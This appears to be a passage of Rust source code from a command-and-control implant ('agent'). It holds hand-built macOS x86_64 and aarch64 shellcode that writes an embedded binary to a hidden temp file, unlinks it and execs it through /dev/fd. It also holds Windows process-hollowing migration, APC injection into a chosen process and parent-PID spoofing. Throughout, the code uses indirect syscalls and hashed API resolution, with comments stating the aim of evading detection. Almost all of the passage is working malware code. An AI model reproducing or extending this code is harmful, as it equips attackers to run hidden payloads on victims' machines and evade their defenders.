    // jnz .itoa_loop (back to itoa_loop_start)
    code.extend_from_slice(&[0x75, 0x00]); // placeholder for rel8
    let rel8_idx = code.len() - 1;
    let loop_size = (code.len() + 2 - itoa_loop_start) as u8;
    code[rel8_idx] = loop_size.wrapping_neg();

    // Prepend "/tmp/.ox" in reverse order (last char first): x o . / p m t /
    for &ch in &[0x78, 0x6f, 0x2e, 0x2f, 0x70, 0x6d, 0x74, 0x2f] {
        // dec r8
        code.extend_from_slice(&[0x49, 0xff, 0xc8]);
        // mov byte [r8], ch
        code.extend_from_slice(&[0x41, 0xc6, 0x00, ch]);
    }

    // === Step 3: open(path, O_RDWR|O_CREAT|O_TRUNC, 0700) ===
    // O_RDWR=2, O_CREAT=0x200, O_TRUNC=0x400 on macOS
    // mov rdi, r8 (path)
    code.extend_from_slice(&[0x4c, 0x89, 0xc7]);
    // mov esi, 0x602 (O_RDWR|O_CREAT|O_TRUNC)
    code.extend_from_slice(&[0xbe, 0x02, 0x06, 0x00, 0x00]);
    // mov edx, 0x1c0 (0700 octal)
    code.extend_from_slice(&[0xba, 0xc0, 0x01, 0x00, 0x00]);
    // mov rax, 0x2000000 + 5 (SYS_open)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 5).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);
    // mov r12, rax (save fd)
    code.extend_from_slice(&[0x49, 0x89, 0xc4]);

    // === Step 4: write(fd, binary_addr, binary_len) ===
    // mov rdi, r12 (fd)
    code.extend_from_slice(&[0x4c, 0x89, 0xe7]);
    // mov rsi, binary_addr
    code.extend_from_slice(&[0x48, 0xbe]);
    code.extend_from_slice(&binary_addr.to_le_bytes());
    // mov rdx, binary_len
    code.extend_from_slice(&[0x48, 0xba]);
    code.extend_from_slice(&(binary_len as u64).to_le_bytes());
    // mov rax, 0x2000000 + 4 (SYS_write)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 4).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);

    // === Step 5: unlink(path) — remove directory entry ===
    // mov rdi, r8 (path still points to "/tmp/.ox<PID>")
    code.extend_from_slice(&[0x4c, 0x89, 0xc7]);
    // mov rax, 0x2000000 + 10 (SYS_unlink)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 10).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);

    // === Step 6: Build "/dev/fd/N" path on stack via itoa ===
    // sub rsp, 32 (path buffer)
    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x20]);
    // lea r8, [rsp+31] (point to last byte)
    code.extend_from_slice(&[0x4c, 0x8d, 0x44, 0x24, 0x1f]);
    // mov byte [r8], 0 (NUL terminator)
    code.extend_from_slice(&[0x41, 0xc6, 0x00, 0x00]);
    // mov rax, r12 (fd for itoa)
    code.extend_from_slice(&[0x4c, 0x89, 0xe0]);

    // itoa loop: convert fd to decimal digits right-to-left
    let itoa2_loop_start = code.len();
    // dec r8
    code.extend_from_slice(&[0x49, 0xff, 0xc8]);
    // xor edx, edx
    code.extend_from_slice(&[0x31, 0xd2]);
    // mov r9d, 10
    code.extend_from_slice(&[0x41, 0xb9, 0x0a, 0x00, 0x00, 0x00]);
    // div r9
    code.extend_from_slice(&[0x49, 0xf7, 0xf1]);
    // add dl, 0x30 ('0')
    code.extend_from_slice(&[0x80, 0xc2, 0x30]);
    // mov [r8], dl
    code.extend_from_slice(&[0x41, 0x88, 0x10]);
    // test rax, rax
    code.extend_from_slice(&[0x48, 0x85, 0xc0]);
    // jnz .itoa2_loop (back to itoa2_loop_start)
    code.extend_from_slice(&[0x75, 0x00]); // placeholder for rel8
    let rel8_idx2 = code.len() - 1;
    let loop_size2 = (code.len() + 2 - itoa2_loop_start) as u8;
    code[rel8_idx2] = loop_size2.wrapping_neg();

    // Prepend "/dev/fd/" in reverse order: / d f / v e d /
    for &ch in &[0x2f, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
        // dec r8
        code.extend_from_slice(&[0x49, 0xff, 0xc8]);
        // mov byte [r8], ch
        code.extend_from_slice(&[0x41, 0xc6, 0x00, ch]);
    }

    // mov rdi, r8 (path pointer for execve)
    code.extend_from_slice(&[0x4c, 0x89, 0xc7]);

    // === Step 7: execve(path, NULL, NULL) ===
    // xor esi, esi (argv=NULL)
    code.extend_from_slice(&[0x31, 0xf6]);
    // xor edx, edx (envp=NULL)
    code.extend_from_slice(&[0x31, 0xd2]);
    // mov rax, 0x2000000 + 59 (SYS_execve)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 59).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);

    // === Step 8: exit(1) fallback ===
    // mov edi, 1
    code.extend_from_slice(&[0xbf, 0x01, 0x00, 0x00, 0x00]);
    // mov rax, 0x2000000 + 1 (SYS_exit)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 1).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);

    code
}

/// macOS aarch64 anonymous temp-file + execve shellcode.
/// Uses BSD syscall ABI: syscall number in x16, invoke via `svc #0x80`.
///
/// Sequence:
///   getpid → itoa → build "/tmp/.ox<PID>" → open → write → unlink →
///   itoa fd → build "/dev/fd/N" → execve → exit(1)
#[cfg(all(target_os = "macos", target_arch = "aarch64"))]
fn build_macos_shm_stub_aarch64_impl(binary_addr: u64, binary_len: usize) -> Vec<u8> {
    let mut insts: Vec<u32> = Vec::new();

    // === Step 1: getpid() → pid in x0 ===
    // movz x16, #20 (SYS_getpid)
    insts.push(0xD2800290);
    // svc #0x80
    insts.push(0xD4000001);

    // === Step 2: Build "/tmp/.ox<PID>" path on stack ===
    // sub sp, sp, #64 (path buffer)
    insts.push(0xD10103FF);
    // add x12, sp, #63 (point to last byte of buffer)
    insts.push(0x9100FDEC);
    // strb wzr, [x12] (NUL terminator)
    insts.push(0x3900019F);
    // mov x0, x0 (pid for itoa, already in x0 from getpid)

    // Initialize the decimal divisor before the first itoa loop.
    // movz x13, #10 (divisor for decimal conversion)
    insts.push(0xD280014D);

    // itoa loop: convert pid to decimal digits right-to-left
    let itoa_start = insts.len();
    // sub x12, x12, #1
    insts.push(0xD100058C);
    // udiv x14, x0, x13 (quotient)
    insts.push(0x9AC00800 | (13u32 << 16) | 14u32);
    // msub x15, x14, x13, x0 (remainder = x0 - x14*x13)
    insts.push(0x9B200000 | (13u32 << 16) | (14u32 << 5) | 15u32);
    // add x15, x15, #0x30 (ASCII '0')
    insts.push(0x9100C1EF);
    // strb w15, [x12]
    insts.push(0x3900018F);
    // mov x0, x14 (quotient becomes next dividend)
    insts.push(0xAA0E03E0);
    // cbnz x0, itoa_start
    let back_offset = (insts.len() - itoa_start) as u32;
    let imm19 = (0x80000u32.wrapping_sub(back_offset)) & 0x7FFFF;
    insts.push(0xB5000000 | (imm19 << 5));

    // Prepend "/tmp/.ox" in reverse order: x o . / p m t /
    for &ch in &[0x78u8, 0x6f, 0x2e, 0x2f, 0x70, 0x6d, 0x74, 0x2f] {
        // sub x12, x12, #1
        insts.push(0xD100058C);
        // movz w15, #ch
        insts.push(0x52800000u32 | ((ch as u32) << 5) | 15);
        // strb w15, [x12]
        insts.push(0x3900018F);
    }

    // === Step 3: open(path, O_RDWR|O_CREAT|O_TRUNC, 0700) ===
    // O_RDWR=2, O_CREAT=0x200, O_TRUNC=0x400 on macOS
    // mov x0, x12 (path)
    insts.push(0xAA0C03E0);
    // movz x1, #0x602 (O_RDWR|O_CREAT|O_TRUNC)
    insts.push(0xD280C041);
    // movz x2, #0x1C0 (0700 octal)
    insts.push(0xD2803822);
    // movz x16, #5 (SYS_open)
    insts.push(0xD28000B0);
    // svc #0x80
    insts.push(0xD4000001);
    // mov x11, x0 (save fd)
    insts.push(0xAA0003EB);

    // === Step 4: write(fd, binary_addr, binary_len) ===
    // mov x0, x11 (fd)
    insts.push(0xAA0B03E0);
    // mov x1, binary_addr
    aarch64_load_64(&mut insts, 1, binary_addr);
    // mov x2, binary_len
    aarch64_load_64(&mut insts, 2, binary_len as u64);
    // movz x16, #4 (SYS_write)
    insts.push(0xD2800090);
    // svc #0x80
    insts.push(0xD4000001);

    // === Step 5: unlink(path) — remove directory entry ===
    // mov x0, x12 (path still points to "/tmp/.ox<PID>")
    insts.push(0xAA0C03E0);
    // movz x16, #10 (SYS_unlink)
    insts.push(0xD2800150);
    // svc #0x80
    insts.push(0xD4000001);

    // === Step 6: Build "/dev/fd/N" path on stack via itoa ===
    // sub sp, sp, #32 (path buffer)
    insts.push(0xD10083FF);
    // add x12, sp, #31 (point to last byte of buffer)
    insts.push(0x91007FEC);
    // strb wzr, [x12] (NUL terminator)
    insts.push(0x3900019F);
    // mov x0, x11 (fd for itoa)
    insts.push(0xAA0B03E0);
    // movz x13, #10 (divisor for decimal conversion)
    insts.push(0xD280014D);

    // itoa loop: convert fd to decimal digits right-to-left
    let itoa2_start = insts.len();
    // sub x12, x12, #1
    insts.push(0xD100058C);
    // udiv x14, x0, x13 (quotient)
    insts.push(0x9AC00800 | (13u32 << 16) | 14u32);
    // msub x15, x14, x13, x0 (remainder = x0 - x14*x13)
    insts.push(0x9B200000 | (13u32 << 16) | (14u32 << 5) | 15u32);
    // add x15, x15, #0x30 (ASCII '0')
    insts.push(0x9100C1EF);
    // strb w15, [x12]
    insts.push(0x3900018F);
    // mov x0, x14 (quotient becomes next dividend)
    insts.push(0xAA0E03E0);
    // cbnz x0, itoa2_start
    let back_offset2 = (insts.len() - itoa2_start) as u32;
    let imm19_2 = (0x80000u32.wrapping_sub(back_offset2)) & 0x7FFFF;
    insts.push(0xB5000000 | (imm19_2 << 5));

    // Prepend "/dev/fd/" in reverse order
    for &ch in &[0x2fu8, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
        // sub x12, x12, #1
        insts.push(0xD100058C);
        // movz w15, #ch
        insts.push(0x52800000u32 | ((ch as u32) << 5) | 15);
        // strb w15, [x12]
        insts.push(0x3900018F);
    }

    // mov x0, x12 (path pointer)
    insts.push(0xAA0C03E0);

    // === Step 7: execve(path, NULL, NULL) ===
    // movz x1, #0 (argv=NULL)
    insts.push(0xD2800001);
    // movz x2, #0 (envp=NULL)
    insts.push(0xD2800002);
    // movz x16, #59 (SYS_execve)
    insts.push(0xD2800770);
    // svc #0x80
    insts.push(0xD4000001);

    // === Step 8: exit(1) fallback ===
    // movz x0, #1
    insts.push(0xD2800020);
    // movz x16, #1 (SYS_exit)
    insts.push(0xD2800030);
    // svc #0x80
    insts.push(0xD4000001);

    // Convert instruction words to little-endian bytes
    insts.iter().flat_map(|i| i.to_le_bytes()).collect()
}

/// Emit movz/movk instruction sequence to load a 64-bit immediate into an
/// aarch64 register.
#[cfg(target_os = "macos")]
fn aarch64_load_64(insts: &mut Vec<u32>, rd: u32, val: u64) {
    let mut first = true;
    for shift in (0..=48).step_by(16) {
        let imm16 = ((val >> shift) & 0xFFFF) as u16;
        if first {
            // movz xd, #imm16, LSL #shift
            insts.push(0xD2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd);
            first = false;
        } else if imm16 != 0 {
            // movk xd, #imm16, LSL #shift
            insts.push(0xF2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd);
        }
    }
    if first {
        // Value was zero; emit movz xd, #0
        insts.push(0xD2800000 | rd);
    }
}

#[cfg(windows)]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};

    // Read the current agent's own executable so we can re-inject ourselves.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let payload = std::fs::read(&agent_path).map_err(|e| {
        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
    })?;

    let access = PROCESS_VM_OPERATION
        | PROCESS_VM_WRITE
        | PROCESS_VM_READ
        | PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION;

    // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
    let process = unsafe {
        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
        let mut client_id = [0u64; 2];
        client_id[0] = target_pid as u64;
        let mut h_proc: usize = 0;
        let status = crate::syscall!(
            "NtOpenProcess",
            &mut h_proc as *mut _ as u64,
            access as u64,
            &mut obj_attr as *mut _ as u64,
            client_id.as_mut_ptr() as u64,
        );
        let status_code = status.unwrap_or(-1);
        if status_code < 0 || h_proc == 0 {
            anyhow::bail!(
                "NtOpenProcess(pid={target_pid}) failed: status={:#010x}",
                status_code as u32
            );
        }
        h_proc as *mut _
    };

    let result = hollowing::inject_into_process(target_pid, &payload);
    unsafe { pe_resolve::close_handle(process) };
    result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
    tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn list_processes_returns_at_least_self() {
        let procs = list_processes();
        assert!(!procs.is_empty(), "expected at least the test process");
        let me = std::process::id();
        assert!(
            procs.iter().any(|p| p.pid == me),
            "the current process ({me}) should be in the list"
        );
    }

    /// The ptrace migration path must reject obviously invalid PIDs (0 and the
    /// agent's own PID) without attempting a ptrace attach.  This tests the
    /// guard logic only — no real system process is touched.
    #[test]
    #[cfg(target_os = "linux")]
    fn migrate_rejects_invalid_pids() {
        // pid=0 is always invalid.
        let err_zero = migrate_to_process(0).unwrap_err();
        assert!(
            err_zero.to_string().contains("invalid migration target")
                || err_zero.to_string().contains("pid 0"),
            "pid=0 should be rejected; got: {}",
            err_zero
        );

        // Migrating into our own process is also rejected.
        let our_pid = std::process::id();
        let err_self = migrate_to_process(our_pid).unwrap_err();
        assert!(
            err_self.to_string().contains("invalid migration target")
                || err_self.to_string().contains("self"),
            "self-migration should be rejected; got: {}",
            err_self
        );
    }

    #[test]
    #[ignore]
    #[cfg(windows)]
    fn test_hollowing() {
        // This test is ignored because it's invasive, but can be run manually.
        // It requires a dummy executable to be present at `target/debug/dummy.exe`.
        // You can create one with `rustc -o target/debug/dummy.exe --crate-type bin tests/dummy_process.rs`
        let _payload = std::fs::read("target/debug/dummy.exe").expect("dummy.exe not found");
        assert!(migrate_to_process(0).is_ok());
    }
}

#[cfg(all(windows, feature = "ppid-spoofing"))]
pub fn get_spoof_parent_pid() -> Option<u32> {
    let procs = list_processes();
    if let Some(explorer) = procs
        .iter()
        .find(|p| p.name.eq_ignore_ascii_case("explorer.exe"))
    {
        return Some(explorer.pid);
    }
    if let Some(svchost) = procs
        .iter()
        .find(|p| p.name.eq_ignore_ascii_case("svchost.exe"))
    {
        return Some(svchost.pid);
    }
    None
}

#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    // Inject into the SUPPLIED pid by:
    //  1. Opening the target process with VM+thread permissions.
    //  2. Allocating RWX memory and writing the payload.
    //  3. Enumerating all threads of the target via TH32CS_SNAPTHREAD.
    //  4. Queuing the APC routine to each thread (they will fire when
    //     that thread next enters an alertable wait state).
    // The original implementation incorrectly spawned a *new* svchost.exe
    // instead of injecting into the supplied `pid`.
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{TH32CS_SNAPTHREAD, THREADENTRY32};
    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
    use windows_sys::Win32::System::Threading::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_SET_CONTEXT};
    use crate::win_types::PAGE_READWRITE;

    unsafe {
        // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut hprocess: usize = 0;
        let open_status = crate::syscall!(
            "NtOpenProcess",
            &mut hprocess as *mut _ as u64,
            (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) as u64,
            &mut obj_attr as *mut _ as u64,
            client_id.as_mut_ptr() as u64,
        );
        let open_status_code = open_status.as_ref().map(|s| *s).unwrap_or(-1);
        if open_status_code < 0 || hprocess == 0 {
            return Err(anyhow::anyhow!(
                "apc_inject: NtOpenProcess(pid={}) failed: status={:?}",
                pid,
                open_status
            ));
        }

        // VirtualAllocEx → NtAllocateVirtualMemory (indirect syscall, no IAT entry)
        // Allocate RW first; switch to RX after writing to avoid RWX pages (IoC avoidance).
        let mut base_addr: usize = 0;
        let mut region_size: usize = payload.len();
        let alloc_status = crate::syscall!(
            "NtAllocateVirtualMemory",
            hprocess as u64,                   // ProcessHandle
            &mut base_addr as *mut _ as u64,   // BaseAddress (in/out)
            0u64,                              // ZeroBits
            &mut region_size as *mut _ as u64, // RegionSize (in/out)
            (MEM_COMMIT | MEM_RESERVE) as u64, // AllocationType
            PAGE_READWRITE as u64,             // Protect
        );
        let alloc_status_code = alloc_status.as_ref().map(|s| *s).unwrap_or(-1);
        if alloc_status_code < 0 || base_addr == 0 {
            let _ = crate::syscall!("NtClose", hprocess as u64);
            return Err(anyhow::anyhow!(
                "apc_inject: NtAllocateVirtualMemory(pid={}) failed: status={:?}",
                pid,
                alloc_status
            ));
        }
        let remote_mem = base_addr as *mut std::ffi::c_void;

        // WriteProcessMemory → NtWriteVirtualMemory (indirect syscall, no IAT entry)
        let mut bytes_written: usize = 0;
        let write_status = crate::syscall!(
            "NtWriteVirtualMemory",
            hprocess as u64,                     // ProcessHandle
            remote_mem as u64,                   // BaseAddress
            payload.as_ptr() as u64,             // Buffer
            payload.len() as u64,                // NumberOfBytesToWrite
            &mut bytes_written as *mut _ as u64, // NumberOfBytesWritten
        );
        let write_status_code = write_status.as_ref().map(|s| *s).unwrap_or(-1);
        if write_status_code < 0 {
            let _ = crate::syscall!("NtClose", hprocess as u64);
            return Err(anyhow::anyhow!(
                "apc_inject: NtWriteVirtualMemory(pid={}) failed: status={:?}",
                pid,
                write_status
            ));
        }

        // VirtualProtectEx → NtProtectVirtualMemory (indirect syscall, no IAT entry)
        // Flip from RW to RX — no write permission at execution time.
        let mut protect_base: usize = base_addr;
        let mut protect_size: usize = payload.len();
        let mut old_protect: u32 = 0;
        let protect_status = crate::syscall!(
            "NtProtectVirtualMemory",
            hprocess as u64,                    // ProcessHandle
            &mut protect_base as *mut _ as u64, // BaseAddress (in/out)
            &mut protect_size as *mut _ as u64, // RegionSize (in/out)
            PAGE_EXECUTE_READ as u64,           // NewProtect
            &mut old_protect as *mut _ as u64,  // OldProtect
        );
        let protect_status_code = protect_status.as_ref().map(|s| *s).unwrap_or(-1);
        if protect_status_code < 0 {
            tracing::warn!(
                "apc_inject: NtProtectVirtualMemory to RX failed for pid={}, memory remains RW (not executable): status={:?}",
                pid, protect_status
            );
            // Continue anyway — the payload won't execute if the page isn't
            // executable, but at least we don't leak RWX pages.  The APC
            // simply won't fire successfully.
        }
        let _ = crate::syscall!("NtClose", hprocess as u64);

        // Snapshot all threads in the system, filter by owner pid, queue APC.
        // Resolve kernel32 functions at runtime to avoid IAT entries.
        let create_snapshot: FnCreateToolhelp32Snapshot =
            pm_resolve_api(HASH_CREATETOOLHELP32SNAPSHOT)?;
        let thread32_first: FnThread32First = pm_resolve_api(HASH_THREAD32FIRST)?;
        let thread32_next: FnThread32Next = pm_resolve_api(HASH_THREAD32NEXT)?;

        let snapshot = create_snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == crate::win_types::INVALID_HANDLE_VALUE as *mut _ {
            return Err(anyhow::anyhow!(
                "apc_inject: CreateToolhelp32Snapshot failed"
            ));
        }

        let apc_routine: windows_sys::Win32::Foundation::PAPCFUNC = std::mem::transmute(remote_mem);
        let apc_routine_addr = apc_routine.map(|f| f as usize as u64).unwrap_or(0);
        if apc_routine_addr == 0 {
            pe_resolve::close_handle(snapshot);
            return Err(anyhow::anyhow!(
                "apc_inject: failed to build APC routine pointer"
            ));
        }
        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        let mut queued = 0u32;
        if thread32_first(snapshot, &mut entry) != 0 {
            loop {
                if entry.th32OwnerProcessID == pid {
                    // NtOpenThread (indirect syscall, no IAT entry).
                    let mut obj_attr_thread: crate::win_types::OBJECT_ATTRIBUTES =
                        std::mem::zeroed();
                    obj_attr_thread.Length =
                        std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
                    let mut cid_thread: u64 = entry.th32ThreadID as u64;
                    let mut hthread: usize = 0;
                    let nt_open = crate::syscall!(
                        "NtOpenThread",
                        &mut hthread as *mut _ as u64,
                        THREAD_SET_CONTEXT as u64,
                        &mut obj_attr_thread as *mut _ as u64,
                        &mut cid_thread as *mut _ as u64,
                    );
                    if nt_open.is_ok() && nt_open.unwrap() >= 0 && hthread != 0 {
                        // P2-31: Wrap the thread handle in NtHandle so it is
                        // automatically closed via NtClose even if an early
                        // return or panic is added to this block later.
                        let _thread_guard = crate::nt_handle::NtHandle::new(hthread);

                        // NtQueueApcThread (indirect syscall, no IAT entry).
                        let nt_apc = crate::syscall!(
                            "NtQueueApcThread",
                            _thread_guard.raw() as u64,
                            apc_routine_addr,
                            0u64,
                            0u64,
                            0u64,
                        );
                        if nt_apc.is_ok() && nt_apc.unwrap() >= 0 {
                            queued += 1;
                        }
                        // _thread_guard dropped here → NtClose via indirect syscall.
                    }
                }
                if thread32_next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }
        pe_resolve::close_handle(snapshot);

        if queued == 0 {
            return Err(anyhow::anyhow!(
                "apc_inject: no threads found in pid={} to queue APC into",
                pid
            ));
        }

        tracing::info!(
            "apc_inject: queued APC in {} thread(s) of pid {}",
            queued,
            pid
        );
        Ok(())
    }
}

#[cfg(windows)]
use crate::injection::InjectionMethod;

#[cfg(windows)]
pub fn select_and_inject(
    pid: u32,
    payload: &[u8],
    method: Option<InjectionMethod>,
) -> anyhow::Result<()> {
    let method = method.unwrap_or(InjectionMethod::NtCreateThread);
    tracing::info!("Dispatching injection using method: {:?}", method);
    crate::injection::inject_with_method(method, pid, payload)
}
